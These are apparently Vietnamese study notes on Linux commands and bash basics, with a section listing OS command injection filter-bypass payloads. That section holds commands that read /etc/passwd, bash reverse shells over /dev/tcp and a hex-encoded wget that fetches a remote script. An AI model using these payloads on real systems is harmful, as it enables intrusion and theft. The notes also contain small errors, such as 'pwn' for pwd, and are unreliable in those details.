# Linux

Linux là một họ các hệ điều hành tự do nguồn mở tương tự Unix và dựa trên Linux kernel, một hạt nhân hệ điều hành được phát hành lần đầu tiên vào ngày 17 tháng 9 năm 1991, bởi Linus Torvalds.

Các phiên bản hệ điều hành Linux phổ biến:

* Ubuntu.
* Fedora – Red Hat.
* Linux Mint.
* Kali Linux.
* CentOS.

Hiện nay thì linux đang là hệ điều hành đang được sử dụng nhiều nhất trên thế giới.
## 1. Các câu lệnh cơ bản

![](https://ductam.info/wp-content/uploads/2018/10/0_dybXjl1uLFUZ9kvc.jpg)

`pwn`: được dùng để tìm đường dẫn của thư mục hiện tại (folder) mà ta đang ở trong đó.

`cd`: để chuyển hướng trong hệ thống tập tin Linux, bạn có thể sử dụng command cd. Nó sẽ cần nhập đường dẫn đầy đủ hoặc tên thư mục ta muốn chuyển tới.

`ls`: được dùng để xem nội dung thư mục, hiển thị danh sách file trong thư mục hiện tại.

`cat`: là một trong các lệnh cơ bản trong Linux được sử dụng thường xuyên nhất trong Linux. Nó được dùng để xem nội dung file trên output tiêu chuẩn (sdout).

`cp`: để sao chép files từ thư mục hiện tại.

`mv`: di chuyển files, dù nó cũng có thể được dùng để đổi tên files.

`mkdir`: để tạo thư mục mới.

`rmdir`: xóa thư mục tuy nhiên thì `rmdir` chỉ xóa được các thư mục rỗng.

`rm`: được sử dụng để xóa thư mục cùng và nội dung bên trong. Nếu chỉ muốn xóa thư mục – tương tự như lệnh
`rmdir` – sử dụng `rm -r`.

`touch`: cho phép tạo files mới trống thông qua dòng lệnh.

`locate`: tìm kiếm (định vị) file, file đó đang nằm ở đâu.

`find`: để xác định vị trí files trong thư mục nhất định.

`grep`: cho phép tìm kiếm tất cả text thông qua tập tin nhất định.

`sudo`: viết tắt của `SuperUser Do` cho phép thực hiện các tác vụ yêu cầu quyền quản trị hoặc quyền root.

`df`: để nhận báo cáo về dung lượng lưu trữ được sử dụng trên hệ thống, hiển thị theo tỷ lệ phần trăm và KBs.

`du`: kiểm tra dung lượng của file hoặc của thư mục.

`head`: được sử dụng để xem dòng đầu tiên của bất kỳ file văn bản nào. Theo mặc định, nó sẽ hiển thị 10 dòng đầu tiên.

`tail`: có chức năng tương tự như command head, nhưng thay vì hiển thị dòng đầu tiên, command tail sẽ hiển thị 10 dòng cuối cùng của file văn bản. 

`diff`: viết tắt của difference, sẽ so sánh nội dung của 2 files từng dòng một. Sau khi phân tích files này, nó sẽ xuất ra các dòng không khớp.

`tar`: là command được sử dụng nén file.

`chmod`: dùng để thay đổi quyền đọc, ghi và quyền thực thi files và thư mục.

`chown`: cho phép thay đổi hoặc chuyển quyền sở hữu file sang tên người dùng được chỉ định.

`jobs`: hiển thị tất cả jobs hiện tại và trạng thái jobs.

`kill`: Nếu có chương trình nào đó không phản hồi, bạn có thể chấm dứt chương trình thủ công bằng cách sử dụng command `kill`.

`ping`: để kiểm tra trạng thái kết nối với server.

`wget`: có thể tải file từ internet xuống.

`uname`: in thông tin chi tiết về hệ thống Linux như tên máy, hệ điều hành, kernel...

`top`: hiển thị danh sách tiến trình đang chạy và lượng CPU mà tiến trình đó sử dụng.

`history`: xem lại những command bạn nhập trước đó.

`man`: hiển thị hướng dẫn thủ công của các command trong linux.

`echo`: được dùng để chuyển dữ liệu vào một file.

`zip, unzip`: Nén và giải nén 1 hay nhiều file, 1 thư mục hay nhiều thư mục.

## 2. Bash cơ bản

Với những ai thường xuyên sử dụng các hệ điều hành Linux cho công việc thì việc thao tác với các dòng lệnh là điều cần thiết và rất quan trọng.
 
Tuy nhiên bất kì ai đã, đang hoặc từng sử dụng Linux thì đều nhận ra các điều sau đây:

* Các chương trình chỉ làm được một công việc đơn giản và không thể làm 2 công việc khác nhau trở lên

* Các chương trình phải hoạt động theo một thứ tự nhất định để thực hiện một công việc nào đó và nếu thay đổi thứ tự này sẽ dẫn đến việc xử lý công việc khác.

* Có một số công việc phải làm với tất suất rất lớn và đôi khi là lặp đi lại trong thời gian ngắn.

Vấn đề này làm cho `bash script` trở nên vô cùng hữu ích. Các script viết ra có thể đảm nhiệm được một công việc ngay lập tức thay vì phải gõ lại một loạt các câu lệnh phức tạp. 

Việc này có thể rút ngắn được thời gian làm việc trên Linux tuy nhiên cần mất công học thêm một ngôn ngữ kịch bản lệnh - `Bash script`.

Bash script là một loại ngôn ngữ kịch bản (tương tự như Perl, Python, Lua ...), thường được viết bởi con người và thực thi bởi máy tính. 

Cũng giống như các ngôn ngữ khác, bash script cũng có riêng một trình thông dịch đó là `BASH` (Bourne Again SHell). Có 2 cách để `bash script` được thực thi:

* Chạy từng dòng một trên cửa sổ `Terminal` hoặc `tty` (ta sẽ không cần quan tâm cách này vì thực tế nó không khác với việc chạy từng câu lệnh để hoàn thành 1 tác vụ nào đó).
* Viết tất cả các câu lệnh cần thiết vào một file Bash `(*.sh)` và thực thi nó.

`#! (shebang)`:  dòng thông báo cho hệ điều hành biết file script này sẽ được thực thi bởi chương trình nào.

#### a. Variable trong Bash: 

Variable (hay biến) chỉ các ô nhớ được khai báo cụ thể.

Để khai báo một biến, ta sử dụng ký hiệu equal `=` đặt giữa tên và giá trị của biến (không được đặt bất cứ dấu *space* nào ở trước hoặc sau `=`.

Để truy cập tới một biến, ta sử dụng ký hiệu dollar `$` ở ngay trước tên biến đó.

#### b. Câu lệnh điều kiện

* Dạng đơn giản: chỉ bao gồm một điều kiện, tùy theo điều kiện đúng hay sai mà sẽ thực hiện câu lệnh cụ thể

```bash
if conditional ; then
    statement_1
else
    statement_2
fi
```
* Dạng đầy đủ: bao gồm từ 2 điều kiện trở lên

```bash
if conditional_1 ; then
    statement_1
elif conditional_2 ; then
    statement_2
else
    statement_3
fi
```

* Dạng mở rộng: có nhiều điện lồng nhau (nested)

```bash
if conditional_1; then
    if conditional_2; then
        statement_1
    else
        statement_2
    fi
fi
```

## 3. Bypass OS Command Injection

OS Command Injection là lỗ hổng cho phép kẻ tấn công thực thi các lệnh bất kì của hệ điều hành trên server chạy ứng dụng với đặc quyền của web server. 

Lỗ hổng OS command injection có thể cho phép kẻ tấn công thực hiện các hành vi như:

* Thực thi lệnh hệ thống.

* Làm tổn hại tới ứng dụng, server chạy ứng dụng cũng như dữ liệu trên đó.

* Thực hiện SSRF.

* Remote Code Execution.

### a. Bypass without space

Read file on server
```sh
cat</etc/passwd

(cat,/etc/passwd)

cat${IFS}/etc/passwd

X=$'cat\x20/etc/passwd'&&$X

bash</etc/passwd

IFS=,;$(cat<<<cat,/etc/passwd)
```

Reverve Shell:

```sh
bash$IFS-i$IFS>&$IFS/dev/tcp/192.168.1.21/8080$IFS0>&1 

echo${IFS}"RCE"${IFS}&&bash${IFS}-i${IFS}>&${IFS}/dev/tcp/127.0.0.1/8080$IFS0>&1

sh</dev/tcp/127.0.0.1/8080

IFS=,;`bash<<<bash,-i,>&/dev/tcp/127.0.0.1/8080;0>&1
```

### b. Bypass characters filter via hex encoding

Read file on server

```sh
cat $(echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")

cat $(xxd -r -p <<< 2f6574632f706173737764)

cat $(xxd -r -ps <(echo 2f6574632f706173737764))
```

(Trong đó giá trị `\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x66` tương ứng với `/etc/passwd` sau khi được hex encoding).

Dowload reverse shell trên server:

```sh
$(xxd -r -p <<< 7767657420687474703a2f2f3132372e302e302e313a313231322f782e7368202d4f202f746d702f792e73680a)

$(xxd -r -ps <(echo 7767657420687474703a2f2f3132372e302e302e313a313231322f782e7368202d4f202f746d702f792e73680a))

$(echo -e "\x77\x67\x65\x74\x20\x68\x74\x74\x70\x3a\x2f\x2f\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x31\x32\x31\x32\x2f\x78\x2e\x73\x68\x20\x2d\x4f\x20\x2f\x74\x6d\x70\x2f\x79\x2e\x73\x68\x0a")

```

(Trong đó giá trị `7767657420687474703a2f2f3132372e302e302e313a313231322f782e7368202d4f202f746d702f792e73680a` tương ứng với `wget http://127.0.0.1:1212/x.sh -O /tmp/y.sh` sau khi được hex encoding).

### c. Bypass without backslash and slash

Trong trường hợp server ngăn chặn OS Commnad Injection bằng cách validate dấu `/` và dấu `\`. Chúng ta thực hiện bypass theo các cách sau:

Read file on server

```sh
cat ${HOME:0:1}etc${HOME:0:1}passwd

cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```

Reverse Shell

```sh
bash -i >& ${HOME:0:1}dev${HOME:0:1}tcp${HOME:0:1}127.0.0.1${HOME:0:1}8080 0>&1

bash -i >& $(echo . | tr '!-0' '"-1')dev$(echo . | tr '!-0' '"-1')tcp$(echo . | tr '!-0' '"-1')127.0.0.1$(echo . | tr '!-0' '"-1')8080 0>&1
```

### d. Bypass Blacklisted words

Read file on server:

```sh
c'a't /etc/passwd

c"a"t /etc/passwd

c\a\t /etc/passwd

ca$@t /etc/passwd

/???/c?t /etc/passwd

/???/c?t /?tc/?as?wd
```

Reverse Shell

```sh
b'a'sh -i >& /dev/tcp/127.0.0.1/8080 0>&1

b"a"sh -i >& /dev/tcp/127.0.0.1/8080 0>&1

b\a\s\h -i >& /dev/tcp/127.0.0.1/8080 0>&1

ba$@sh -i >& /dev/tcp/127.0.0.1/8080 0>&1

/???/b?sh -i >& /dev/tcp/127.0.0.1/8080 0>&1
```

### e. Bypass with a line return

```sh
something%0Acat%20/etc/passwd
```
## 4. Viết 1 file bash

```bash
#!/bin/bash
menu=(
"Ten may: `cat /etc/os-release | grep -w "NAME"|cut -d '=' -f2`"
"Ban phan phoi: `cat /etc/os-release | grep -w "VERSION"|cut -d '=' -f2`"
"He dieu hanh: `cat /proc/version |cut -d '=' -f2`"
"Ten CPU: `cat /proc/cpuinfo | grep -w "model name" |cut -d ':' -f2`"
"Bit CPU: `lscpu | grep -w "CPU op-mode(s)" | cut -d ':' -f2`"
"Toc do CPU `lscpu | grep -w "CPU MHz"|cut -d ':' -f2` Mhz"
"Dung luong o cung: `df -h /dev/sda1 --output=size|grep "G"`" 
"Dung luong con lai: `df -h /dev/sda1 --output=avail|grep "G"`"
"Dia chi ip: `ip addr |grep -w "inet"|cut -d '/' -f2 | tr -s ' '|cut -d ' ' -f3`"
)

for ((i=0;i<${#menu[@]};i++))
do
    echo -e ${menu[i]} 
done
```
## 5. Tham khảo:

* https://github.com/swisskyrepo/PayloadsAllTheThings

* ....